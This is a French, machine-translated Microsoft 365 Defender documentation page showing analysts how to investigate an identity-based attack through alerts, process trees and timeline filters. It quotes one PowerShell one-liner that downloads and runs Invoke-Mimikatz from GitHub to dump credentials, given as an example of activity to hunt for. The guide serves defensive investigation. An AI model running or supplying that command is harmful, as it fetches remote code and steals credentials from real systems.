---
title: Exemple d’attaque basée sur l’identité
description: Analyse pas à pas d’une attaque basée sur l’identité.
keywords: incidents, alertes, examiner, corrélation, attaque, ordinateurs, appareils, utilisateurs, identités, identité, boîte aux lettres, courrier électronique, 365, microsoft, m365, réponse aux incidents, cyber-attaque
search.product: eADQiWindows 10XVcnh
ms.prod: m365-security
ms.mktglfcycl: deploy
ms.sitesec: library
ms.pagetype: security
f1.keywords:
- NOCSH
ms.author: josephd
author: JoeDavies-MSFT
ms.localizationpriority: medium
manager: dansimp
audience: ITPro
ms.collection:
- M365-security-compliance
- m365initiative-m365-defender
ms.topic: conceptual
search.appverid:
- MOE150
- MET150
ms.technology: m365d
ms.openlocfilehash: 4f15bf358d180e30ab34abff3105ba77edb6fa0d
ms.sourcegitcommit: d4b867e37bf741528ded7fb289e4f6847228d2c5
ms.translationtype: MT
ms.contentlocale: fr-FR
ms.lasthandoff: 10/06/2021
ms.locfileid: "60149830"
---
# <a name="example-of-an-identity-based-attack"></a>Exemple d’attaque basée sur l’identité

[!INCLUDE [Microsoft 365 Defender rebranding](../includes/microsoft-defender.md)]

**S’applique à :**
- Microsoft 365 Defender

Microsoft Defender pour l’identité peut vous aider à détecter les tentatives malveillantes de compromission des identités dans votre organisation. Étant donné que Defender pour l’identité s’intègre à Microsoft 365 Defender, les analystes de sécurité peuvent avoir une visibilité sur les menaces provenant de Defender for Identity, telles que les tentatives d’élévation de privilège Netlogon suspectes.

## <a name="analyzing-the-attack-in-microsoft-defender-for-identity"></a>Analyse de l’attaque dans Microsoft Defender pour l’identité

Microsoft 365 Defender permet aux analystes de filtrer les alertes par source de détection sous l’onglet **Alertes** de la page Incidents. Dans l’exemple suivant, la source de détection est filtrée sur **Defender for Identity**. 

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-mdi-filter.png" alt-text="Exemple de filtrage de la source de détection pour Defender for Identity.":::

La sélection de **l’alerte d’attaque** suspectée de surpassage de hachage permet d’Microsoft Cloud App Security page qui affiche des informations plus détaillées. Vous pouvez toujours en savoir plus sur une alerte ou une attaque en sélectionnant En savoir plus sur ce **type** d’alerte pour lire une [description](/defender-for-identity/lateral-movement-alerts#suspected-overpass-the-hash-attack-kerberos-external-id-2002) de l’attaque ainsi que des suggestions de correction.
 
:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-alert-example.png" alt-text="Exemple d’une alerte d’attaque suspectée de surpasser le hachage."::: 

## <a name="investigating-the-same-attack-in-microsoft-defender-for-endpoint"></a>Étude de la même attaque dans Microsoft Defender pour le point de terminaison

Un analyste peut également utiliser Defender pour point de terminaison pour en savoir plus sur l’activité sur un point de terminaison. Sélectionnez l’incident dans la file d’attente des incidents, puis sélectionnez **l’onglet Alertes.** À partir de là, ils peuvent également identifier la source de détection. Une source de détection étiquetée comme PEPT signifie Endpoint Detection and Response, qui est Defender for Endpoint. À partir de là, l’analyste sélectionne une alerte détectée par PEPT.

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-mde-edr.png" alt-text="Exemple de détection et de réponse de point de terminaison dans Defender pour le point de terminaison."::: 

La page d’alerte affiche diverses informations pertinentes telles que le nom de l’appareil, le nom d’utilisateur, l’état de l’examen automatique et les détails de l’alerte. L’article d’alerte représente une représentation visuelle de l’arborescence de processus. L’arborescence de processus est une représentation hiérarchique des processus parents et enfants liés à l’alerte.

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-mde-tree.png" alt-text="Exemple d’arborescence de processus d’alerte dans Defender pour le point de terminaison."::: 

Chaque processus peut être étendu pour afficher des détails supplémentaires. Les détails qu’un analyste peut voir sont les commandes réelles qui ont été entrées dans le cadre d’un script malveillant, les adresses IP de connexion sortante et d’autres informations utiles.

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-process-details.png" alt-text="Exemple de détails de processus dans Defender pour le point de terminaison.":::
 
En sélectionnant **Voir dans la** chronologie, un analyste peut aller encore plus loin pour déterminer l’heure exacte de la compromission. 

Microsoft Defender pour le point de terminaison peut détecter de nombreux fichiers et scripts malveillants. Toutefois, en raison de nombreuses utilisations légitimes pour les connexions sortantes, PowerShell et l’activité de ligne de commande, certaines activités seraient considérées comme étant anodins jusqu’à ce qu’elles créent un fichier ou une activité malveillant. Par conséquent, l’utilisation de la chronologie permet aux analystes de mettre l’alerte en contexte avec l’activité qui l’entoure pour déterminer la source ou l’heure d’origine de l’attaque qui, sinon, est masquée par l’activité courante du système de fichiers et des utilisateurs. 

Pour ce faire, un analyste commence au moment de la détection de l’alerte (en rouge) et fait défiler vers le bas dans le temps pour déterminer à quel moment l’activité d’origine qui a conduit à l’activité malveillante a réellement commencé. 

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-start-time.png" alt-text="Exemple de démarrage au moment de la détection de l’alerte."::: 

Il est important de comprendre et de distinguer les activités courantes telles que les connexions de mise à jour Windows, le trafic d’activation de logiciels Windows approuvé, d’autres connexions communes aux sites Microsoft, l’activité Internet tierce, l’activité Microsoft Endpoint Configuration Manager et toute autre activité faible contre une activité suspecte. Une façon d’y parvenir consiste à utiliser des filtres de chronologie. De nombreux filtres peuvent mettre en évidence une activité spécifique tout en filtrant tout ce que l’analyste ne souhaite pas afficher. 

Dans l’image ci-dessous, l’analyste a filtré pour afficher uniquement les événements réseau et de traitement. Cela permet à l’analyste de voir les connexions réseau et les processus qui entourent l’événement où Bloc-notes a établi une connexion avec une adresse IP, ce que nous avons également vu dans l’arborescence des processus. 

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-notepad.png" alt-text="Exemple de la façon Bloc-notes utilisé pour établir une connexion sortante malveillante."::: 

Dans cet événement particulier, Bloc-notes utilisé pour établir une connexion sortante malveillante. Toutefois, souvent, les personnes malveillantes utilisent simplement iexplorer.exe pour établir des connexions pour télécharger une charge utile malveillante, car en règle iexplorer.exe processus sont considérés comme une activité régulière du navigateur web.

Un autre élément à rechercher dans la chronologie serait l’utilisation de PowerShell pour les connexions sortantes. L’analyste recherche les connexions PowerShell réussies avec des commandes telles qu’une connexion sortante à un site web hébergeant `IEX (New-Object Net.Webclient)` un fichier malveillant. 

Dans l’exemple suivant, PowerShell a été utilisé pour télécharger et exécuter Mimikatz à partir d’un site web :

```powershell
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds
```
Un analyste peut rapidement rechercher des mots clés en tapant le mot clé dans la barre de recherche pour afficher uniquement les événements créés avec PowerShell. 

## <a name="next-step"></a>Étape suivante

Consultez le [chemin d’accès de l’enquête](first-incident-path-phishing.md) sur le hameçonnage.

## <a name="see-also"></a>Voir aussi

- [Vue d’ensemble des incidents](incidents-overview.md)
- [Gérer des incidents](manage-incidents.md)
- [Examiner des incidents](investigate-incidents.md)
